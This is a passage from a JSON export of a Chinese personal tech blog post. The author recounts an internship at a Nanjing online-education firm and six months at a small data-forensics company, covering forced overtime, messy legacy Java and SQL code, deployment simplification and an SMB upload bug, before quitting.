[{"title":"2021·中章","url":"/2021/07/01/2021%C2%B7%E4%B8%AD%E7%AB%A0/","content":"<blockquote>\n<p>我以为一个“技术博客”写些无病呻吟或骂街发泄的故事是不合时宜的，但近期工作上一些尤为荒唐的经历还是值得大书特书一番。故事中的人物身份、地点均已隐去，不存在侵权or人身攻击行为。偶然发现这篇博文的朋友们，若有兴趣听我发牢骚的不妨端个小板凳坐下，这故事可能有点长。</p>\n</blockquote>\n<span id=\"more\"></span>\n<h2 id=\"实习\"><a href=\"#实习\" class=\"headerlink\" title=\"实习\"></a>实习</h2><p>2020.12，过年前的一个月，收到学校的通知，被告知“我们这一届首次采用去企业进行毕业设计”，呵~，又是“首次”。加之我还是大数据实验班的，背着这个“Buff”，还被要求做“大数据和人工智能”相关的课题。距离过年不足一个月，秋招都没参加的我找个有大数据/人工智能业务的公司谈何容易…..于是在邻居的介绍下，手忙脚乱去了南京一家“大数据”公司。老板看了简历，都没有安排面试就然我直接入职。</p>\n<p>入职当天早上，没人给我安排任何事。桌上散落着电线和螺丝，我自行清理了大半天后，望着空荡荡的桌面，就掏出自带的笔记本开始随便写点啥。直到下午，主管Y来了，看了我一眼，叫Z同事给我安排了第一个任务：设计实验指导书。</p>\n<p>我接触到的项目是该公司的线上大数据教育平台，类似“实验楼”这种网站，它是为某些专科高校具体定制的，提供在线实验环境。而我的任务则是设计一些大数据相关实验，如Spark的安装，Spark RDD基本算子，Hadoop的WebRank算法。第一个实验是MapReduce对某些数据集进行统计，然后用ECharts可视化。对于这种CSDNN上烂大街的Getting Start实验，我写了一小时不到就写完了，然后就没事干了。由于邻居大哥也在此上班，到了晚上6点了，大哥催我下班，我却被同事告知要留下来，我震惊道：“难道第一天就要加班？”。</p>\n<p>果然，第一天就加班加到8点，然而加班不是干活，而是跳舞————给年会排练节目，于是就这样，我们部门的人年前几乎每天都留下来“跳舞”。</p>\n<p>之后几天又接到一个新“任务”：给线上视频课程系统导入章节数据。数据写好在Excel里，按照他们的意思，我要做的只是复制粘贴，然后点击提交。有感于这项工作的无聊，以及身为程序员天生讨厌重复性工作，我写了个脚本，用Node从Excel中读取数据然后向接口自动POST。之后同事们果然搞出了一堆脏数据，删不了，只能重建库，他们让我再次导入一次数据。还好我之前写好了脚本，不然真要被折腾几次……再之后，我又照着知识点陆续设计了十几个其他的实验，提供源码和实验指导书，年前的任务也就完成了。</p>\n<p>跳舞排练了大半个月，年会前几天，主管把我们几个实习生叫来，告诉我们：我们是实习生，所以年会就不“要求”留下来了。后来被旁边同事告知，这是怕我们年会上抽到奖品，导致老员工不快。没事，我本来就社恐，不去也挺好的。</p>\n<p>2月，回家过年，之后发生了什么大家都知道了（COVID，Lockdown）</p>\n<p>3月，疫情比预想中的严重，大家都在家看网课，老板意识到这是个推广线上教育的好机会，于是在工作群中开始了Remote Work，每日照常打卡，但主管还是催着我们尽快回去上班。3月中旬老家检查口一放开，我就火速来到南京，隔离了两周后上班。来了之后才发现，全公司没几个人，南京本地人都没来几个，我这个外地的倒是听话的很。由于人员缺少，我这个原本被安排写实验报告和打杂的，也被要求干正式工的活：录课程视频。你说我一个来写代码的，怎么就成讲课老师了呢？？？于是乎自己做PPT，自己录视频，干了一周。大老板对于项目十分重视，来查看课程质量，看了之后很不满意，认为质量太差（我也有同感，要是我来选，Cousera和腾讯课堂上那么多课免费的高质量课程不香吗？非得用这满是BUG排版极丑的系统折腾自己？）。主管大手一挥：“之前录了几个月的视频，全部重来。接下来一周要重做年前几个月的工作量，务必抓紧时间乘机抢占市场！”。于是开始了上午开会、下午做PPT、晚上录课的生活。上个月还在我对面开外放刷爱奇艺的主管，这个月在老板面前忽然如同打了鸡血一样亢奋。要我说，录课的同事水平不一，大部分也就刚接触大数据的概念，照着博客和百科上的介绍念稿子（我真的怀疑他们能否听懂自己讲的什么）。而审核同事把重点放在了PPT的样式上，一会儿说这边标题要大点，一会儿说那边图片移个位置，而对于空洞单薄的内容倒是不闻不问。一会儿说这是面向专科学生的，要控制视频长度，要简洁；一会儿又说这边讲的不够详细之类，合着“Hadoop的历史发展”是重点，“HDFS的备份机制”不是重点，哈哈哈哈哈。行吧，你说啥就是啥，我干就是了，我就是个打工的，你到时候给我盖个实习证明的章就行。</p>\n<p>要提交企业实习证明了，拿着学校开的证明书找人事盖章，结果人事看来半天，抠出一行字眼：“公司需要监督学生完成毕业设计”，说不能盖章：万一我不好好写毕设，没有完成，是不是要企业承担法律责任，而且这个实习时间也是不确定的，要是我提前走了，是不是还要付安全责任。我当时就满脸黑人问号，心想：我拿着100一天的工资，天天加班跟你们跳舞，帮你们打杂一个月，你们还需要抠这个字眼？这么怕风险，你们招什么人。但气归气，章还是要盖的，针对他们的每一点要求，我跑前跑后给教务处打电话询问能否修改实习协议部分词句，折腾几次最终拿到了盖章的证明。</p>\n<p>三月中旬，同学们的开题报告都已经交了，很多同学的公司Mentor把他们在公司做的项目直接作为了课题，允许他们以此作为毕业设计，而我忙着给这家公司打杂，啥也没有来得及写。这一个月内，想想自己做了啥：写实验报告、写数据导入脚本、做PPT，我总不能交个《基于PPT的大数据教学》作为题目吧？公司的几个“大数据”项目，全是保密的市政数据，我自然是摸不到的。意识到这个公司不会在毕业设计上给我提供任何帮助，我也认清现实，抛弃幻想：反正我独立完成毕业设计绰绰有余，来这里就当给你“白嫖”，你给我盖个章就行。于是我自己搞了个《基于大数据的知乎舆情分析平台的设计与实现》的开题交了上去。由于同学们很多有导师指导，有的甚至直接接手了一个已经完成了差不多的项目，他们就轻松的多。而我白天要写实验报告，做PPT，写稿子，晚上回去录视频，到了深夜才能开始搞自己的毕设。大数据相关的项目需要数据，哪里有数据？自己爬。由于受限知乎的反爬虫系统，每秒只能爬一条，开了客厅的台式机，隔壁的树莓派服务器，爬了大半个月，终于爬到了几个G的数据。3月疫情丝毫没有好转，之前要求必须去企业做毕设的学院，忽然态度一百八十度大转弯，要求全体学生不允许去企业现场实习（东B的传统艺能了），辅导员还给我家里人打电话，一天几次，要求上报位置。要毕业了，也不想和学院扯皮，不听话万一扣我毕业证咋办？只能和主管提出Work From Home。</p>\n<p>3月底，回家干活，省去了来去的时间，终于可以挤点时间给毕业设计了，但白天的活丝毫没有少，甚至变得更多。每天还是做PPT、改PPT、写稿、录视频。我透过公司的VPN看共享文件夹，我提交的通过审核的视频不比几个老油条少。大概过了两周，主管让同事给我发消息，问我什么时候回来，告诉我“如果现在不回来就不要来了”。我先是一愣，然后感觉有点想笑，那么就不来了把，翌日前往公司，离职、交接、一气呵成。随便找了两关系较好的同事请求交接，不料他们都表示自己也要走了。整个实习期间，公司没有给我配置电脑，让我用自己的，头一次看到被白嫖时间还要求自带生产资料的。回去后，毕设的项目才开始真正推动，几乎从零开始奋战两个月，才把代码，论文等相关资料全部搞定。</p>\n<p>由于要自己创造课题、自己提需求、自己写实现，我的毕业设计差不多付出了别人双倍的时间。那些在企业就拿到现成项目的，只需要写个论文即可，而且有真实商业背景，论据充分，着实让人羡慕。而我从零开始搞了两个月的项目，用了分布式Scrapy做爬虫，用上了HBase，Spark，Spark Streaming等大数据工具，还看吴恩达视频学了点NLP，自己训练了个LSTM的情绪分类模型，用neo4j移植到Scala Play Framework中，还自学了Typescript，用Antd Pro写了一套前端可视化，实现了一个采集-存储-分析-展示的系统。一顿操作猛如虎，最后拿的分数还不如在某些大厂实习用PHP+MySQL+JQuery写的“大数据”项目分数高，更是被保研搞炼丹术（Deep Learning）的“炼药师”摁在地上摩擦。算了，我也习惯了，多少分也无所谓了，至少我的东西每一行都是自己写的，我问心无愧。</p>\n<h2 id=\"工作\"><a href=\"#工作\" class=\"headerlink\" title=\"工作\"></a>工作</h2><p>2020.6月末尾，终于拿到了双证。想去大厂找工作，由于之前被公司业务和毕业设计压得喘不过气，还没正儿八经复习和面试过一次，心里很慌。加之疫情原因也不敢去北上广，南京又没有啥好机会，一时间很迷茫。父亲让我准备继续考研，但是家里人意见不一，争执不下。直到9月，小伙伴都工作几个月了，感觉实在压力太大，实在复习不下去，开始写简历找工作。把简历挂到BOSS上，但是看到校招都已经结束，社招的要求高的离谱（各个都要求精通，面经全是“分布式”，“微服务”，“高并发”），所以迟迟没敢主动投递。但是没几天一家公司给我早晚连续电话轰炸，一天三个未接来电，晚上又打给我，我接了。HR说这是一家做“大数据取证”的，问我是否有兴趣。由于是接到主动面试邀请的电话，我就欣然去面了。先是做题：Java基础知识 + Leetcode A+B Problem。之后技术面，面试官也就是部门主管，满口“红黑树”，“操作系统线程、死锁”这些问题，果然和网上说的八股文一模一样。结束时，他问我有什么要问的，我想到在上一家公司的经历，只提了两个问题：</p>\n<ol>\n<li>有没有人带。</li>\n<li>加班情况如何。</li>\n</ol>\n<p>主管的回答是：当然有人带啊，有事才加班。后来我怀疑我是不是少听了两个字：“才怪”</p>\n<p>之后HR就开始讨论薪资，根据我了解到同学里最低是9000，我就报了个9000，HR当场给我否了，并开始PUA。之后就是如同查户口般的填表，调查家庭背景。下午就接到电话说通过了，薪资给到税前6700 + 300餐补，问我什么时候来，我说10月初就来。招聘写的朝9晚5，签合同时HR却告诉我是大小周，虽然觉得被耍了有点膈应，但一想到单身狗周末也没啥事干，但没管那么多直接答应了。</p>\n<p>10月3日，节后第一天，来到这里，HR给我安排了一个位置，上来就感觉有些不对劲：公司的规模和描述的明显不符，差不多只有50人，都不到招聘介绍上写的一半规模。第一天，内网的GitLab，Wiki啥的工具都没人跟我讲，我照着之前人电脑留下的历史记录，摸清了公司的基本业务和开发工具。下午，产品就给我看了一个Springboot CRUD管理系统的项目的用户使用手册，就让我加一个功能。我看了下项目，写的很乱，命名规则各种不符和规范，IDEA右侧滚动条全是密密麻麻的warning黄线，让我大为吃惊，因为我从来没见过这么离谱的代码。项目没有文档，代码也没有注释，甚至前端照着后端的拼写错误将错就错，我只能照着用户操作手册开控制台找接口，根据接口找Controller，再到Service，一步步定位到目标代码。明明实在做开发，却感觉是在做逆向。由于新功能只要加个Controller和Service和一张SQL表即可，我很快就写好了，但第一天来就要上手项目，觉得还是有点离谱，心想：这就是小公司吗，这么奔放？没人带的情况下让新人第一天做功能，还改表？出了问题算谁的？做好了之后，我就和前端联调接口了，后来才发现这个项目、乃至整个公司只有一个前端……</p>\n<p>3天后，主管回来了，给新人考核上写了我的工作量，然后我就通过了“考核”，被拉进了正式群，后来得知，所谓的新人7天考核就是来直接安排上手项目，看新人能不能没有文档、没人带的情况下干活，不能干的的就找个理由开除。刚来的时候，看到“新人群”里就我一个人，我还在群里找到了之前来这的试用期的人写的日报：Vue安装和JDBC使用啥的，我还很奇怪为什么只有1次日报，后来才知道是这种Vue和JDBC安装都困难的人应该第二天就直接被开了……第一周最后一天晚上，老板请客去海底捞吃了一顿，劝酒，且气氛诡异，后来得知，这种团建往往是要“救火”的前兆。</p>\n<p>给第一个纯CRUD的XX管理系统加了个功能后就再也没碰过那个项目，我被安排接了另外一个项目：一个更大更复杂的CRUD系统。项目大概就是：隔壁C艹组从手机中取各种应用的用户数据，然后存到一个数据集里，我们的“分析系统”导入他们的数据，转存到本地表里，然后做一些分析和展示。项目是之前一个组留下的（据说他们全组集体辞职了，还有个南大的）。系统功能不少，但是很不稳定，点进去一看，一个Class 1w行，IDEA里全是Warning。数据库里全是用”+”拼接的SQL语句和参数。只要遇到某个参数里有引号，就会导致SQL语句执行错误，然后控制台打满Exception瞬间GG。我寻思：这是人干的事？2020年了，一个几万行代码项目里还有在写原生JDBC的人？为什么我之前说项目是“不稳定”，而不是“不能用”，是因为这位写SQL字符串拼接的前辈，好像意识到了参数有引号的问题，于是写了一些工具类，把拼接的字符串参数里的引号去掉，而且，只改了一部分…..所以项目也是随机出BUG。嗯，天才的设计，暴力出奇迹，可是，为什么不试试神奇的Prepared Statement呢？后来他们说这是之前写C++的老组长写的Java代码，这么大力出奇迹情有可原。嗯….可你非要用原生JDBC你不会封装个字符串转义工具吗？这好像是缺乏抽象思维能力而不是只会写C++的锅把？难道写C++的老程序员就不学设计模式了？更绝的是，他们一会儿用原生JDBC，一会儿用JPA，一会儿Controller里用JDBC Template写SQL，一会儿在Service里写SQL…..一开是我觉得写这些代码的人只是单纯的蠢，直到后来，我看他们写了个全是BUG的链接池，明明引入了Hikari还要自己写连接池，结合到之前这组集体辞职，我意识到他们可能不是蠢而是有意为之，结合我后来的经历我也能理解他们为何如此在项目代码里发泄。我们花了大半个月把一万多行手写的SQL拼接的存储逻辑改成了JPA实现，终于数据能稳定导入了。</p>\n<p>下一个任务是修复项目中的Solr模块和词云模块。词云来自于对导入数据的分词统计，主要问题是无法及时生成，有时候多达半小时才能生成，主管要我把词云从Quartz定时任务改成主动触发。我检查代码发现词云任务的Cron表达式把0.5写在小时位上而不是分钟位上，半分钟一次变成了半小时一次，这不出玄学BUG才怪呢，改个cron表达式不久好了吗。但既然你非要从定时任务里拆掉，那就拆掉呗。至于Solr，该项目用Solr作为全文搜索引擎，之前的Solr Schema是DIH生成的，Solr实际上就是数据库的副本。最好当然是按照业务需要为特定字段设计一个统一的Schema，但是我打开数据库一看，几百张表……，代码里Solr相关15000行以上，要改Schema代码基本要重写，一个星期不可能改的完，更何况和产品沟通后他连搜索模块要搜索哪些些内容的需求都没搞清楚……于是只能拖到以后了。就这样直到离职我都没看到有单独划开时间给重构Solr业务。</p>\n<p>来了一周左右，同事开始天天跟我阴阳怪气，说“你在不加班，就见不到你了，分分钟开除”。我不以为然，我说：“我事情都做完了，为什么要留下来”。然后过了几天，主管亲自找我，问我有没有啥想法，说最近事情多，让我留一下。我感觉最近他们的确挺忙，那我就帮帮忙吧，于是留下来了。一个月后发了第一个版本，上一批人留下的这个坑终于能勉强填平了。我以为要开始回归正常上下班了，然后我们组却开始了有规律的124加班到7点半，周35准时下班的“潜规则”（人事自诩周3为小周末）。说起潜规则，此公司从不给工资条，老板发表讲话也要统计签到，估计听老板训话也算在“绩效”里，也是条潜规则。老板在新人培训上时不时强调，新人最好要多留两小时学习，留下来看看书提升技术。对于这种“学习”行为，他们奖励留2小时的20块。反正回去也没啥事，我想想也无所谓，我这种没有夜生活的人回家也是写代码看书，正好到家8点多在健身房关门前还能锻炼一小时，我以为退让一步就能海阔天空，所以按照他们要求留下来“学习”。有同事没有主动“学习”，于是它受到了老板“友好”的“警告”。有趣的是，HR还把加班排行榜发在群里，然后迅速撤回来疯狂暗示。</p>\n<p>由于项目太拉跨，白天我还是不断修改历史遗留问题，逐个功能重构，乐此不疲。晚上5.30他们去小店吃饭，慢慢悠悠不想回去，我催着他们回去写代码，结果被鄙视：“你是不是干活上瘾啊？”，事后想，我的确有点奋斗B了。同事告诉我“你干那么多有什么用？”，他说他刚来时也看见BUG一堆改了很多，结果主管问：“你为什么要改？程序跑了没问题你改什么”。所以他再也不自作多情了，如今成了老油条的一员。之后我又接手了主管手上的活：Python的数据导入模块，对其他厂家的各种格式的数据集，适配自家的数据库格式，支持其他家的报告导入自家系统，也就是枯燥的数据处理工作。</p>\n<p>我这奋斗B似乎就成了背锅的最佳人选。有一次，主管吧一个内外网功能模块让我实现，结果去了现场后发现外网文件过不来，说是我写的BUG，还指出一行报错。我一看，寻思：这地方不是你写的吗？都跑了几个版本了能有什么错？大概率是网闸配错了啊。于是我让他检查网闸，一步一步来，但他坚称网闸没问题，说：“我不管，现象就是这个”，我就很无语，我都告诉你了怎么测试，你动动你高贵的手和嘴有事吗？一直跟我强调“现象就是这个”是铁了心要我背锅？出差系统装没装成无所谓，有人背锅就行是吧？后来电话里听到有人说“网闸错了”，你啪就给我电话挂了，很快啊！第二天，我记得你说我路径写的不合理，我还信以为真了，可同事告诉我，就是网闸配错了，呵呵。之后网闸模块大改的阶段，客户打电话想试用新版本，你好像完全没有记得之前的麻烦吗？我还没写，测试也没测，你就答应第二天就去装。你对我的水平这么信任，我真是诚惶诚恐！</p>\n<p><img src=\"1.jpg\" alt=\"\"></p>\n<p>半泽直树真是青年人的职场教科书。</p>\n<p><img src=\"2.jpg\" alt=\"\"></p>\n<p>2021年初，老板来检查我们新年来一个月项目的进度，看到我们只做了个上传进度条的功能大为光火，然后每周固定3天加班到7.30的日子也到头了，主管开了个会说：“我们这么加班，也不是个办法，老板说了，不要刻意一周三天加班，就这样把，忙的时候多加点，松的时候少加点。所以这周开始忙，加到8.30吧”，听到这里，我一开始居然天真的相信了，但奇怪的是，这个“忙”月，根本没有什么事可以做。同事们除了抱怨几声，还是同意了，在吃饭的时候，好几个同事还是表达了消极怠工的情绪。正当我为这种莫名其妙的加班感到匪夷所思的时候，主管在说出了那句让我记忆深刻的名言：“<strong>现在市场竞争都很激烈，我们也不知道能不能做出好的产品，但是只要你肯加班，你就对得起你自己</strong>”。这句话，简直震碎了我的三观，<strong>加班=对得起自己</strong>？这是哪个高人发明的等式？</p>\n<p>雇佣更少的人干更多的事，尤其在互联网行业，企业宁可安排一个人干两个人的事，给出大于两个人的工资，马督公认为这是互联网行业性质的必然性：企业的目的是为了减少沟通成本并提高效益。牢厂和火星厂也许业务的确多，加班多、高工资、勉强可以解释，但我们这种百人小公司，不足20个的开发，开着大厂1/5的工资，干着“本分厂”的工作时长，您哪来的勇气？我们只是为了满足老板的虚荣心：看到8：30时园区里最亮的那一层，让老板从潜意识里认为自己是互联网公司老总？我想有这层原因，但更深层次的目的是：控制。还记得来的时候这种留下来的行为叫“学习”，可是我晚上闲的时候真的拿起了书，为什么忽然就“有活儿干”了？是怕老板认为部门很闲？有钉钉不用，隔三岔五逼我摘下耳机给我安排鸡毛蒜皮小事？你在怕什么？</p>\n<p>从“松紧制”实行后，就没松下来，一忙“忙”到了四月，但感觉干的活反而少了。4月的版本发布后，客户导入了远超设计考虑的数据，结果卡的系统进不去。回来后，主管又说出了第二句名言：“<strong>你们开发难道对技术没有敏感性吗，你们来这儿难道是为了赚钱</strong>？”。hhhhh我啸了，你呢？很早我就说过分库分表的问题，说过部分代码要花时间重构，不让改是你，让改也是你。合着你的目的是：想要系统稳定运行，又不愿意承担责任？可是世界上，哪有身居高位、拿着高薪、不需要担责任的活儿啊，“高处不胜寒”，懂？4月来了个做CV的研究生实习生，正好我们系统有自动识别和归类图片的需求，让研究生写了个分类器。结果让人家自己一个人爬图片，自己训练模型，自己评估，还给我们封装SDK。完事了还怪人家识别的不准。产品事先不做任何识别准确性评估，等我们这Springboot调用识别模块开发集成好了再把功能直接砍掉，让我们这个月等于啥都没干，于是又有理由加班了，嘿嘿。</p>\n<p>我还没去过福报厂，却吃到了PUA：产品和主管一唱一和演双簧：“还好加班，不然路上堵车都回不去”，我都替你们尴尬；还没去过国企，却吃到了国企的官僚：大领导来讲话你还敢来不听？没去过牢厂，却感受到了部门之间沟通效率之低下。一份工作，三分经验，吃到我撑。</p>\n<p>公司对自己人的操作秀到飞起：</p>\n<p>休息日还要求加班，园区修路导致同事迟到，他拿着额外加班去抵扣却被告知“主管没有申请加班，不算加班”，秀啊。</p>\n<p>偷偷改钉钉考勤规则，抽几天考勤规则改成中午也要打卡，导致当天考勤旷工（算0小时），成功拉低工作时间统计，秀啊。</p>\n<p>把技术支持出差装系统的活推给部门的人去干，部门有人出差算0工时，借此拉低部门加班时间，秀啊。</p>\n<p>这些对付自己人的点子花在项目上，东西能做成这样么？被20人规模的小公司的产品超过，很意外吗？这项目拉一个人独立写前后端，或许3个月能写出个更好的，真就3个和尚没水喝？</p>\n<p>我和同事开玩笑道：我们项目开始走下坡路始于年初，年初做上传进度条做了一个月，老板不开心了，之后越加班效率越低。可是为什么会做这么久呢，产品不该掺和开发？还是开发偷懒？二者兼而有之。不合理的加班制度催生了第二点，缺席的培养机制催生了第一点。还记得我来时提过的唯二的问题吗，现在得到了回答。我至今不能理解，这个公司是这么有脸理直气壮的在招聘宣传上造假，把大小周吹成双休，把体系化的加班吹成“偶尔加班”，把CRUD单机项目吹成大数据，把打杂鼓吹成“培养”来诈骗应届生————或许他们本来就不需要招人，本来就是骗应届补贴的？真如主管所说公司靠老板人脉吃饭，大概率我们都只是来配合老板演戏的小丑。</p>\n<p>系统中上传需要的本地程序是隔壁C++组写的，自我参与项目后便一直听到同事抱怨隔壁写的东西有BUG，上传速度贼慢。可是主管只让自查，又不愿问问隔壁要代码。是哦，部门之间多一事不如少一事，人家有BUG，怎么能让高贵的C++程序员改呢？<strong>小的不冤，是写C++的老爷冤！小的不应该DEBUG用Wireshark抓包，才无意发现了写C++老爷的BUG，小的该死，小的这就去兼容他的BUG！</strong>。谈到项目改进目标时就开始讲：“这项目还是要看隔壁C++组做数据采集的，他们采的全卖的就好”，合着我们组干啥也是全部木大木大木大木大，那你们招Java干嘛呢，招个机器人只要交点电费不就好了吗？还能无限加班听老板画大饼。</p>\n<p>在公司一半时间听产品和老油条吵架，一半时间帮运维干活。项目用到了一大堆组件：nginx、node koa、tomcat、springboot、rabbitmq、erlang、redis、mysql、zookeeper……我一个开发自己都得装办小时，而那些非科班的运维就更离谱。运维大概是没有做过任何培训，只会照着开发给的安装手册敲，甚至看不懂报错，例如：<code>cd cloudpluss</code>如果敲成<code>cd cloudplus</code>，他们不顾<code>cd: no such file or directory: cloudplus</code>的报错会一直敲下去。于是这样运维出去装系统的时候都成了开发的噩梦，运气好一点：开发需要远程开着向日葵帮运维干活，运气差一点：客户不让用外网，运维拍照让开发解决问题。我接触到的运维基本上都是就装几个组件，然后把烂摊子交给开发收拾，装一半让你去解决问题往往比让你从头安装更恶心人，经常如此一整天就浪费掉了（好耶，0产出，加班加班）。作为开发我也是觉得系统难装，安装文档写的稀烂不说，很多组件都是不必要的。前端部署在tomcat上，静态资源（附件）部署在nginx上，下载资源为了改个HTTP Response Header居然单独用node + Koa!经过我一顿修改，前端，静态资源，下载都通过nginx解决，一下省去了安装node和tomcat。rabbitmq实现两个服务的解耦，只定义了几个channel，我们这么点qps杀鸡焉用牛刀？于是自己在Springboot里写了个轻量级JSON RPC调用框架，用对象JSON序列化反序列化，依赖HTTP请求实现RPC，这下干掉了rabbitmq，顺带干掉了Erlang。因为项目有个位数的接口用到了Dubbo的RPC，而Zookeeper只是为Dubbo装的，这部分也迁移到自己实现的JSON RPC后成功干掉Zookeeper。这么一来系统简洁多了，只剩下nginx、springboot、mysql、redis。我写了个脚本一键安装，然后就可以喝杯咖啡等5分钟看结果了。本想推广自动化安装，提出来很多方案如docker，打iso镜像、打vmdk镜像、用shell脚本，都被主管拒绝了，原因是“不给运维锻炼的机会”。可是我看运维也没能得到锻炼，倒是我们自己得到了锻炼，如果运维出差只要跑个脚本就行，那么以后系统装不成功岂不是就没法甩锅了？最终，我还是偷偷做了个脚本交给了隔壁运维的某人，不知道他们用的如何，我是感觉从此以后他们似乎骚扰我的频率下降了不少。针对安装文档稀烂的原因，我觉得是文档还在用xml写，没人愿意维护，于是提出来用markdown重写。我自己开了个头选了模板，写了markdown的pandoc编译脚本，但是无人响应，加上主管也不支持，于是重构文档不了了之。</p>\n<p>前期我还做一些Java相关的活：维护Solr模块、正则提取敏感信息、数据挖掘，后期基本上就只用Python做数据导入了，这时候遇到了项目期间最棘手也是最滑稽的一个BUG。我们用户上传的文件有两种，一种是目录，一种是压缩包，无论哪种都有十多GB。上传是通过本地上传程序实现的（把本地文件拷贝到远端SMB服务的某个目录），上传完成后触发解析。判断一个上传任务完成居然是Python这边进行的，之前人做的判断原理是：监听任务目录大小，60s不改变了就认为上传完成了，然后解压或者直接解析。我们发现上传压缩包经常会解压失败（文件损坏），一开始主管觉得是我Python写的不对，他也说不出哪里不对，直到后来我灵光一现把解压失败的压缩包用Hex Editor打开，发现文件后半段全是0，这才意识到问题。原来SMB上传文件到Linux会先创建stat，分配磁盘空间写0，然后异步拷贝。这就导致了上传目录时，拷贝的都是小文件，60s可以够小文件拷贝成功，而上传压缩包这种大文件60s内是无法拷贝完成的。面对十多GB的压缩包，SMB会先创建文件并写0，然后文件大小就不在变化了，但是实际拷贝会持续远超60s，于是执行后续流程解压的时候文件大概率是损坏的。跟主管报告了这个问题，他来了一句：“我就说是这问题嘛”，给我整的目瞪口呆。关于解决这个问题，必须更换检测上传完成的方法，这肯定要修改本地上传程序要它主动通知。由于涉及到隔壁C++组，主管又开始让我们兼容BUG，他告诉我：“客户网络是万兆网，什么文件都一秒传完，没这个问题”。</p>\n<p>后来全部数据解析模块都迁移到了我这里，之前Java里那1w行的屎山终于可以删掉了。为了Python这里实现数据解析，我利用Python的函数式编程特性，将数据处理逻辑函数写进了配置，自己写个框架就行，教会测试后让他帮我写数据处理配置，这一下就轻松了很多。这样干掉了大量的if语句，还能更快速定位问题的源头。公司能采集到的数据不全，于是想着去逆向其他厂商的数据格式并提供大一统平台的确是个不错的思路，可是公司不愿购买一套其他厂商的产品，也不让运维部门提供完整的数据样本，逆向也不能对着空气虚空逆向吧？最终就是数据根本导不全。</p>\n<p>要不是4月遇到了一位志同道合、有点技术追求的苏宁老哥，也许我4月就打算拍拍屁股走人了，他的加入使我一度觉得这项目还有救。然而四月底，老板又是一顿喷，主管使用了最终大招：“要么封闭式开发，要么彻底996”。我选择第三条：拜拜了宁勒。好像是老板嗅到了什么，提出了加薪，我在第二天，交上了《离职告知书》。我相信这是一次正确的决定，要我说我这6个月做错了什么，那就是到现在才意识到问题：整个公司就是建立在诈骗上的：招聘写双休955，来了变大小周，一周变976，一个月变986，再往后996，等我接受了996，是不是还要我接受封闭式开发？976的时候亏了钱，996的时候亏了身体，等真被骗去“封闭式”，怕是进了传销窝小命不保。</p>\n<p>还记得交离职报告那个早上，人事先是一惊，旋即让我找领导同意。我告诉他，我不需要领导同意。在她坚持不收的时候，我严词告诉她：“我觉得这是你的责任，无论领导同不同意，你都要收下”。随后主管和我谈话，说人事认为我刚才很“生气”，我否认了。但真不生气是不可能的：“都摊牌了还要骗人吗？”。如果你以为《离职告知书》还要申请同意，我认为你身为人事业务不精，是蠢；如果你知道它的涵义，还要我去“申请”，那就是坏。</p>\n<p>晚上，人事老大找我，我以为要谈交接，结果她问：“你剩下一个月能不能继续加班？不然会打击他们的士气”，听完我血压都上来了：毕竟我不能影响一个不存在的东西。但是最后一个月，我还是加了大半个月的班，这次我倒是主动的，原因是最后一个月接手了隔壁C++组写的本地Qt程序，找到了有意义的事情可以干了。我在本地程序上加了些新功能，还用Go重写了一份（完事后我才发现C++组的写的东西混乱程度和我们也五五开嘛，可能也是加班搞的？）用Go重写了隔壁的项目后，才发现以往的上传速度真不能怪网速，不是运维接错了千兆网网口，而是代码太垃。重写后的本地程序修复了拖了6个月的BUG，还支持了数据厂商类型的自动检测，希望这可以节约下一波接盘该系统的人时间，让下一波人不要因为测试传错了包互相扯皮。此外还大大优化了上传和解析流程，原来遇到十多G的数据要半小时才能完成上传和解析，如今上传和解析异步执行，同样的任务甚至1分钟就可完成，这让我在表演加班和维护屎山几个月后感受到久违的成就感。离职后我在家从头写了一个功能加强版的超大文件通用上传器<a href=\"https://github.com/XUranus/smb-uploader\">smb-uploader</a>，额外支持了断点续传、托盘、进度显示。</p>\n<p>最后一个月和第一个月，是最快乐两个月，第一个月是新鲜感的快乐，最后一个月便是找回自我的快乐。</p>\n<h2 id=\"有所思\"><a href=\"#有所思\" class=\"headerlink\" title=\"有所思\"></a>有所思</h2><p>我感觉，我还是幸运的。在这个大环境下，我至少干着自己喜欢的事，还没有柴米油盐之愁，没有房贷，不是必须要修福报。在我大学四年和工作所见的同学同事中，大多入行计算机只是为了生活罢了，能乐在自己喜欢的行业中何其幸运。高中的时候，父母让我读金融，我说：那都是操作资本，收割大众的行业，我没兴趣，我要做能够创造价值，惠及大众的职业。我觉得计算机行业的伟大之处是他创造的生产力融入各行各业，解放劳动力，从而给予个体更多自我发展的机会。作为程序员，我乐意看到自己做出的东西节约了一个群体的时间，而认识到时间的宝贵也使我厌恶他人浪费我自己的时间。我在这两二家公司做了事，浪费了自己的时间，也没能节约别人的时间，这是我必须要离开的一个原因。</p>\n<p>都说必然性寓于偶然性之间，并通过偶然性表现出来。连吃两次亏已经不再是偶然了，而是存在必然，究其根本还是我个人性格的弱点：太唯意志了，就是自负、轻选择、重努力。在学校时，各门实验课上我从不挑队友，总觉得求人不如求己，相信自己能卷，能摆平一切。于是到了社会，我也是这种学生思维，天真的觉得：小公司又有啥？还是要靠个人努力。直到设身处地才知个人在这荒诞现实中的渺小。</p>\n<p>塞翁失马，焉知非福。相比那些依然身处象牙塔的同学们，我浪费了不少时间，但社会，何尝不是一所大学呢。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>后来，听人说，第一家公司的那主管被公司开了，不知道是公司要上市的原因还是他自己的原因。</p>\n<p>后来，第二家公司人事找我谈话，说知乎上关于公司的恶评影响到了招聘。我告诉他：我当初看过言辞更激烈的，我不还是来了，但你们留住我了吗？（如今我觉得她可能怀疑是我写的）</p>\n<p>后来，听同事讲，项目要黄了。有点开心，也有点难过，毕竟是自己付出心血的东西。</p>\n<p>再后来，测试也走了，据说部门拆了，估计是没招到人，也许是老板的耐心达到了极限。</p>\n<p>离职后在看准网上才发现各种负面评价，其中一条还是南大某同学写的，他是这个项目的上一波人。看他字里行间控诉公司这种骚操作，如同在看自己的经历，此时此刻，恰如彼时比刻。一波一波人重复新的轮回，每年都会有新鲜的应届生被收割。不光是我们来了没多久，其实我们主管也是新来不久的啊，这流动性简直了。同事曾告诉我，干的越快，老板炒你越快，之前一组没能消化老板的大饼，集体跑路了，或许是我的这位主管大智大慧，怕发挥全部实力容易被老板迅速榨干价值然后开除呢？（笑）</p>\n<p>离职半年，那个让我离职期间继续加班的HR，他的钉钉认证也消失了，它在我之后来，一年也没干满。她也和我抱怨过工作难做人难招，自己上有老下有小。原来每个人都不容易啊。可能老板觉得：“我这么好生待你们，你们写出这狗屎了对得起我吗”；可能主管觉得：“之前一组没干下去，都是老